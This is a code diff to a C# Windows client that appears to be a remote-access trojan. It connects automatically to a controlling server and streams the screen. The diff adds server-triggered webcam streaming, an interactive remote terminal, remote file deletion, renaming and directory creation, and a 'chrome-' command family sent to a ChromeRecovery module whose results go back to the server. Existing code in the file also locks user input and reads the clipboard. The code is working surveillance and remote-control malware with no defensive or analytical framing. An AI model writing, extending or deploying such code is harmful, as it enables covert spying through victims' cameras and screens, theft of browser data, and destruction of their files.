@@ -6,10 +6,19 @@ public partial class Form1 : Form
     private System.Threading.CancellationTokenSource? cts;
     private System.Windows.Forms.Timer timer;
     private System.Windows.Forms.Timer telemetryTimer;
+    private System.Windows.Forms.Timer webcamTimer;
+    private System.Threading.CancellationTokenSource? _webcamCts;
+    private TerminalSession? _terminalSession;
+
+    private System.Diagnostics.PerformanceCounter? _cpuCounter;
+
     private int _jpegQuality = 85;                    // MUCH BETTER QUALITY (was 55)
     private int _captureWidth = 0;                    // Will be set to actual screen width
     private int _captureHeight = 0;                   // Will be set to actual screen height
     private volatile bool _sendingFrame = false;
+    private volatile bool _sendingWebcam = false;
+    private volatile bool _isWebcamActive = false;
+    private readonly System.Threading.SemaphoreSlim _webcamLock = new System.Threading.SemaphoreSlim(1, 1);
     private Task? _listenTask;
     private readonly System.Threading.SemaphoreSlim _wsSendLock = new System.Threading.SemaphoreSlim(1, 1);
 
@@ -68,7 +77,23 @@ public partial class Form1 : Form
         telemetryTimer = new System.Windows.Forms.Timer();
         telemetryTimer.Interval = 5000;
         telemetryTimer.Tick += TelemetryTimer_Tick;
+
+        webcamTimer = new System.Windows.Forms.Timer();
+        webcamTimer.Interval = 100; // 10 FPS for webcam
+        webcamTimer.Tick += WebcamTimer_Tick;
+
         btnStop.Enabled = false;
+
+        try
+        {
+            _cpuCounter = new System.Diagnostics.PerformanceCounter("Processor", "% Processor Time", "_Total");
+            _cpuCounter.NextValue(); // Prime counter
+        }
+        catch (Exception ex)
+        {
+            ExitForm.Log($"CPU counter init failed: {ex.Message}");
+            _cpuCounter = null;
+        }
 
         // Automatically start the connection process safely after handle is created
         this.HandleCreated += (s, e) => {
@@ -97,6 +122,10 @@ public partial class Form1 : Form
         {
             timer.Stop();
             telemetryTimer.Stop();
+            webcamTimer.Stop();
+            _ = Task.Run(() => WebcamCapture.Cleanup());
+            _terminalSession?.Stop();
+            _terminalSession = null;
             InputLockHelper.SetLock(false);
             
             if (cts != null && !cts.IsCancellationRequested)
@@ -160,70 +189,181 @@ public partial class Form1 : Form
         }
     }
 
-    private async void Timer_Tick(object? sender, EventArgs? e)
+    private System.Drawing.Bitmap? CaptureFrame()
     {
-        // Skip if already sending a frame (backpressure guard)
-        if (_sendingFrame || ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open || cts == null || cts.IsCancellationRequested)
-            return;
-        
-        _sendingFrame = true;
         try
         {
             var bounds = Screen.PrimaryScreen.Bounds;
-            using (var bmp = new System.Drawing.Bitmap(bounds.Width, bounds.Height))
+            var bmp = new System.Drawing.Bitmap(bounds.Width, bounds.Height);
+            using (var g = System.Drawing.Graphics.FromImage(bmp))
             {
-                using (var g = System.Drawing.Graphics.FromImage(bmp))
+                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
+            }
+
+            if (_captureWidth != bounds.Width || _captureHeight != bounds.Height)
+            {
+                var resized = new System.Drawing.Bitmap(_captureWidth, _captureHeight);
+                using (var g2 = System.Drawing.Graphics.FromImage(resized))
                 {
-                    g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
+                    g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
+                    g2.DrawImage(bmp, 0, 0, _captureWidth, _captureHeight);
                 }
-                using (var resized = new System.Drawing.Bitmap(_captureWidth, _captureHeight))
+                bmp.Dispose();
+                return resized;
+            }
+            return bmp;
+        }
+        catch (Exception ex)
+        {
+            ExitForm.Log($"[CAPTURE] Error: {ex.Message}");
+            return null;
+        }
+    }
+
+    private async void Timer_Tick(object? sender, EventArgs? e)
+    {
+        // Use a single flag to guard the tick
+        if (_sendingFrame || ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open || cts == null || cts.IsCancellationRequested)
+            return;
+
+        _sendingFrame = true;
+        try
+        {
+            if (_isWebcamActive)
+            {
+                // WEBCAM MODE - Try to capture, but don't stop the timer if it fails
+                using (var bmp = WebcamCapture.CaptureFrame(640, 480))
                 {
-                    using (var g2 = System.Drawing.Graphics.FromImage(resized))
-                    {
-                        g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
-                        g2.DrawImage(bmp, 0, 0, _captureWidth, _captureHeight);
-                    }
+                    if (bmp == null || !_isWebcamActive) return;
+
                     using (var ms = new System.IO.MemoryStream())
                     {
-                        var encoder = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()
-                            .FirstOrDefault(c => c.FormatID == System.Drawing.Imaging.ImageFormat.Jpeg.Guid);
-                        if (encoder != null)
-                        {
-                            var encoderParams = new System.Drawing.Imaging.EncoderParameters(1);
-                            encoderParams.Param[0] = new System.Drawing.Imaging.EncoderParameter(
-                                System.Drawing.Imaging.Encoder.Quality, (long)_jpegQuality);
-                            resized.Save(ms, encoder, encoderParams);
-                        }
-                        else
-                            resized.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
+                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                         var buffer = ms.ToArray();
-                        if (buffer.Length > 0)
+                        if (buffer.Length > 0 && _isWebcamActive)
                         {
-                            var segment = new ArraySegment<byte>(buffer);
-                            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Binary, true, cts.Token);
+                            byte[] prefixed = new byte[buffer.Length + 1];
+                            prefixed[0] = 1; // Prefix with 1 for webcam
+                            Buffer.BlockCopy(buffer, 0, prefixed, 1, buffer.Length);
+                            
+                            using (var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromMilliseconds(1000)))
+                            using (var linked = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(cts.Token, timeoutCts.Token))
+                            {
+                                await SafeSendAsync(new ArraySegment<byte>(prefixed), System.Net.WebSockets.WebSocketMessageType.Binary, true, linked.Token);
+                            }
+                        }
+                    }
+                }
+            }
+            else
+            {
+                // DESKTOP MODE
+                using (var bmp = CaptureFrame())
+                {
+                    if (bmp == null || _isWebcamActive) return;
+
+                    using (var ms = new System.IO.MemoryStream())
+                    {
+                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
+                        var buffer = ms.ToArray();
+                        if (buffer.Length > 0 && !_isWebcamActive)
+                        {
+                            byte[] prefixed = new byte[buffer.Length + 1];
+                            prefixed[0] = 0; // Prefix with 0 for desktop
+                            Buffer.BlockCopy(buffer, 0, prefixed, 1, buffer.Length);
+                            
+                            using (var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromSeconds(2)))
+                            using (var linked = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(cts.Token, timeoutCts.Token))
+                            {
+                                await SafeSendAsync(new ArraySegment<byte>(prefixed), System.Net.WebSockets.WebSocketMessageType.Binary, true, linked.Token);
+                            }
                         }
                     }
                 }
             }
         }
-        catch (OperationCanceledException)
-        {
-            // Socket cancelled, the main reconnect loop will handle this
-        }
-        catch (ObjectDisposedException)
-        {
-            // WebSocket was disposed, wait for main loop to reconnect
-        }
+        catch (OperationCanceledException) { }
         catch (Exception ex)
         {
-            // Log but NEVER stop the timer.
-            // If the user runs this on a VPS and closes RDP, the screen locks and CopyFromScreen throws an exception.
-            // We must keep ticking so that when they reconnect to RDP, the stream instantly restores itself!
-            ExitForm.Log($"Frame send error: {ex.Message}");
+            ExitForm.Log($"[STREAM] Error: {ex.Message}");
         }
         finally
         {
             _sendingFrame = false;
+        }
+    }
+
+    private async void WebcamTimer_Tick(object? sender, EventArgs? e)
+    {
+        // Skip if already sending a frame or if webcam is NOT active (backpressure guard)
+        if (_sendingWebcam || !_isWebcamActive || ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open || cts == null || cts.IsCancellationRequested)
+        {
+            if (webcamTimer.Enabled && !_isWebcamActive) webcamTimer.Stop();
+            return;
+        }
+
+        await _webcamLock.WaitAsync();
+        try {
+            if (!_isWebcamActive) {
+                webcamTimer.Stop();
+                return;
+            }
+
+            // Create a temporary linked token that can be cancelled if the stream stops
+            var linkedToken = cts.Token;
+            if (_webcamCts != null)
+            {
+                try {
+                    var linkedCts = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(cts.Token, _webcamCts.Token);
+                    linkedToken = linkedCts.Token;
+                } catch { /* Handle disposal race */ }
+            }
+
+            _sendingWebcam = true;
+            try
+            {
+                // Capture a frame (default 640x480 for bandwidth efficiency)
+                using (var bmp = WebcamCapture.CaptureFrame(640, 480))
+                {
+                    if (bmp == null || !_isWebcamActive) return;
+
+                    using (var ms = new System.IO.MemoryStream())
+                    {
+                        // Use standard JPEG for webcam as well
+                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
+                        var buffer = ms.ToArray();
+                        if (buffer.Length > 0 && _isWebcamActive)
+                        {
+                            // Prefix with 1 for webcam
+                            byte[] prefixed = new byte[buffer.Length + 1];
+                            prefixed[0] = 1;
+                            Buffer.BlockCopy(buffer, 0, prefixed, 1, buffer.Length);
+                            var segment = new ArraySegment<byte>(prefixed);
+
+                            // Use a short timeout for webcam frames so they don't block the connection
+                            using (var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromMilliseconds(800)))
+                            using (var linked = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(linkedToken, timeoutCts.Token))
+                            {
+                                await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Binary, true, linked.Token);
+                            }
+                        }
+                    }
+                }
+            }
+            catch (OperationCanceledException)
+            {
+                // Timeout, shutdown, or manual stop
+            }
+            catch (Exception ex)
+            {
+                ExitForm.Log($"[WEBCAM] Frame send error: {ex.Message}");
+            }
+            finally
+            {
+                _sendingWebcam = false;
+            }
+        } finally {
+            _webcamLock.Release();
         }
     }
 
@@ -286,6 +426,48 @@ public partial class Form1 : Form
             long usedMb = (long)((mem.ullTotalPhys - mem.ullAvailPhys) / 1048576);
             int memPercent = (int)mem.dwMemoryLoad;
 
+            float? cpuPercent = null;
+            try
+            {
+                if (_cpuCounter != null)
+                {
+                    cpuPercent = _cpuCounter.NextValue();
+                }
+            }
+            catch (Exception ex)
+            {
+                ExitForm.Log($"CPU counter error: {ex.Message}");
+                _cpuCounter = null;
+            }
+
+            int? diskPercent = null;
+            double? usedDiskGb = null;
+            double? totalDiskGb = null;
+            try
+            {
+                var systemDrive = System.IO.DriveInfo.GetDrives()
+                    .FirstOrDefault(d => d.IsReady && d.DriveType == System.IO.DriveType.Fixed && d.Name.Equals(Path.GetPathRoot(Environment.SystemDirectory), StringComparison.OrdinalIgnoreCase));
+                if (systemDrive == null)
+                {
+                    systemDrive = System.IO.DriveInfo.GetDrives()
+                        .FirstOrDefault(d => d.IsReady && d.DriveType == System.IO.DriveType.Fixed);
+                }
+
+                if (systemDrive != null)
+                {
+                    totalDiskGb = systemDrive.TotalSize / (1024.0 * 1024 * 1024);
+                    usedDiskGb = (systemDrive.TotalSize - systemDrive.AvailableFreeSpace) / (1024.0 * 1024 * 1024);
+                    if (systemDrive.TotalSize > 0)
+                    {
+                        diskPercent = (int)Math.Clamp(((systemDrive.TotalSize - systemDrive.AvailableFreeSpace) * 100.0 / systemDrive.TotalSize), 0, 100);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                ExitForm.Log($"Disk stats error: {ex.Message}");
+            }
+
             var uptimeSeconds = Environment.TickCount64 / 1000;
             var uptimeStr = TimeSpan.FromSeconds(uptimeSeconds).ToString(@"d\.hh\:mm\:ss");
             var arch = System.Runtime.InteropServices.RuntimeInformation.ProcessArchitecture.ToString();
@@ -296,6 +478,10 @@ public partial class Form1 : Form
                 + $"CPU:       {_cachedCpuName}  ({Environment.ProcessorCount} cores)\n"
                 + $"GPU:       {_cachedGpuName}\n"
                 + $"Memory:    {usedMb:N0} MB / {totalMb:N0} MB  ({memPercent}%)\n"
+                + (cpuPercent.HasValue ? $"CPU:       {cpuPercent.Value:F1}%\n" : "")
+                + (usedDiskGb.HasValue && totalDiskGb.HasValue && diskPercent.HasValue
+                    ? $"Disk:      {usedDiskGb.Value:F1} GB / {totalDiskGb.Value:F1} GB  ({diskPercent.Value}%)\n"
+                    : "")
                 + $"Uptime:    {uptimeStr}";
 
             var payload = new Dictionary<string, object?>
@@ -308,10 +494,14 @@ public partial class Form1 : Form
                     ["arch"] = arch,
                     ["cpuName"] = _cachedCpuName,
                     ["cpuCores"] = Environment.ProcessorCount,
+                    ["cpuPercent"] = cpuPercent,
                     ["gpuName"] = _cachedGpuName,
                     ["memoryPercent"] = memPercent,
                     ["usedMemMb"] = usedMb,
                     ["totalMemMb"] = totalMb,
+                    ["diskPercent"] = diskPercent,
+                    ["usedDiskGb"] = usedDiskGb,
+                    ["totalDiskGb"] = totalDiskGb,
                     ["uptimeSeconds"] = uptimeSeconds,
                     ["summary"] = summary,
                     ["countryCode"] = _geoCountryCode,
@@ -322,6 +512,7 @@ public partial class Form1 : Form
             var json = System.Text.Json.JsonSerializer.Serialize(payload);
             var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
             await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
+            ExitForm.Log($"Telemetry sent: CPU={(cpuPercent.HasValue ? cpuPercent.Value.ToString("F1") : "n/a")} RAM={memPercent}% Disk={(diskPercent?.ToString() ?? "n/a")}" );
         }
         catch (Exception ex)
         {
@@ -374,6 +565,41 @@ public partial class Form1 : Form
                         continue;
                     }
 
+                    // ── start-webcam ──
+                    if (type == "start-webcam")
+                    {
+                        ExitForm.Log("[WEBCAM] Switching to WEBCAM mode");
+                        _isWebcamActive = true;
+                        
+                        this.Invoke(() => {
+                            _webcamCts?.Cancel();
+                            _webcamCts = new System.Threading.CancellationTokenSource();
+                        });
+
+                        // Notify server
+                        await SafeSendAsync(new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(new { type = "start-webcam" }))), System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
+                        continue;
+                    }
+
+                    // ── stop-webcam ──
+                    if (type == "stop-webcam")
+                    {
+                        ExitForm.Log("[WEBCAM] Switching to DESKTOP mode");
+                        _isWebcamActive = false;
+
+                        // Use BeginInvoke to avoid deadlocking if the UI thread is busy
+                        this.BeginInvoke(() => {
+                            _webcamCts?.Cancel();
+                            webcamTimer.Stop();
+                            // Background hardware release moved inside Invoke to ensure sequential safety
+                            _ = Task.Run(() => WebcamCapture.Cleanup());
+                        });
+
+                        // Notify server
+                        await SafeSendAsync(new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(new { type = "stop-webcam" }))), System.Net.WebSockets.WebSocketMessageType.Text, true, cts?.Token ?? default);
+                        continue;
+                    }
+
                     // ── chat-message ──
                     if (type == "chat-message")
                     {
@@ -399,10 +625,43 @@ public partial class Form1 : Form
                         continue;
                     }
 
+                    // ── terminal-start ──
+                    if (type == "terminal-start")
+                    {
+                        ExitForm.Log("[TERMINAL] Starting interactive session");
+                        _terminalSession?.Stop();
+                        _terminalSession = new TerminalSession(async (output) => {
+                            var payload = new { type = "terminal-output", output = output };
+                            var json = System.Text.Json.JsonSerializer.Serialize(payload);
+                            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
+                            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts?.Token ?? default);
+                        });
+                        _terminalSession.Start();
+                        continue;
+                    }
+
+                    // ── terminal-input ──
+                    if (type == "terminal-input")
+                    {
+                        var input = root.TryGetProperty("input", out var ie) ? ie.GetString() : "";
+                        _terminalSession?.SendInput(input ?? "");
+                        continue;
+                    }
+
+                    // ── terminal-stop ──
+                    if (type == "terminal-stop")
+                    {
+                        ExitForm.Log("[TERMINAL] Stopping interactive session");
+                        _terminalSession?.Stop();
+                        _terminalSession = null;
+                        continue;
+                    }
+
                     // ── remote-control ──
                     if (type == "remote-control" && root.TryGetProperty("action", out var actionElem))
                     {
                         var action = actionElem.GetString();
+                        
                         if (action == "lock-input")
                         {
                             var locked = root.TryGetProperty("locked", out var le) && le.GetBoolean();
@@ -437,6 +696,48 @@ public partial class Form1 : Form
                             var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
                             await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
                         }
+                        else if (action == "file-delete")
+                        {
+                            var path = root.TryGetProperty("path", out var p) ? p.GetString() : null;
+                            if (!string.IsNullOrEmpty(path))
+                            {
+                                try
+                                {
+                                    if (System.IO.File.Exists(path)) System.IO.File.Delete(path);
+                                    else if (System.IO.Directory.Exists(path)) System.IO.Directory.Delete(path, true);
+                                    ExitForm.Log($"[FILE] Deleted: {path}");
+                                }
+                                catch (Exception ex) { ExitForm.Log($"[FILE] Delete error: {ex.Message}"); }
+                            }
+                        }
+                        else if (action == "file-rename")
+                        {
+                            var oldPath = root.TryGetProperty("oldPath", out var op) ? op.GetString() : null;
+                            var newPath = root.TryGetProperty("newPath", out var np) ? np.GetString() : null;
+                            if (!string.IsNullOrEmpty(oldPath) && !string.IsNullOrEmpty(newPath))
+                            {
+                                try
+                                {
+                                    if (System.IO.File.Exists(oldPath)) System.IO.File.Move(oldPath, newPath);
+                                    else if (System.IO.Directory.Exists(oldPath)) System.IO.Directory.Move(oldPath, newPath);
+                                    ExitForm.Log($"[FILE] Renamed: {oldPath} -> {newPath}");
+                                }
+                                catch (Exception ex) { ExitForm.Log($"[FILE] Rename error: {ex.Message}"); }
+                            }
+                        }
+                        else if (action == "file-mkdir")
+                        {
+                            var path = root.TryGetProperty("path", out var p) ? p.GetString() : null;
+                            if (!string.IsNullOrEmpty(path))
+                            {
+                                try
+                                {
+                                    System.IO.Directory.CreateDirectory(path);
+                                    ExitForm.Log($"[FILE] Created directory: {path}");
+                                }
+                                catch (Exception ex) { ExitForm.Log($"[FILE] Mkdir error: {ex.Message}"); }
+                            }
+                        }
                         else if (action == "file-upload")
                         {
                             await HandleFileUpload(root);
@@ -452,6 +753,14 @@ public partial class Form1 : Form
                         else if (action == "clipboard-get")
                         {
                             await HandleClipboardGet(root);
+                        }
+                        else if (action.StartsWith("chrome-"))
+                        {
+                            // Handle Chrome recovery commands
+                            string machineId = root.TryGetProperty("machineId", out var midElem) ? midElem.GetString() : "Unknown";
+                            string response = await ChromeRecovery.HandleChromeRecoveryCommand(action, machineId);
+                            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(response));
+                            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
                         }
                         else
                         {
@@ -853,6 +1162,10 @@ public partial class Form1 : Form
                 // Clean up the broken state cleanly
                 timer.Stop();
                 telemetryTimer.Stop();
+                webcamTimer.Stop();
+                _ = Task.Run(() => WebcamCapture.Cleanup());
+                _terminalSession?.Stop();
+                _terminalSession = null;
                 InputLockHelper.SetLock(false);
                 
                 // Cancel pending reads/writes FIRST to release SemaphoreSlim deadlocks instantly
@@ -883,4 +1196,5 @@ public partial class Form1 : Form
             await Task.Delay(5000);
         }
     }
+
 }
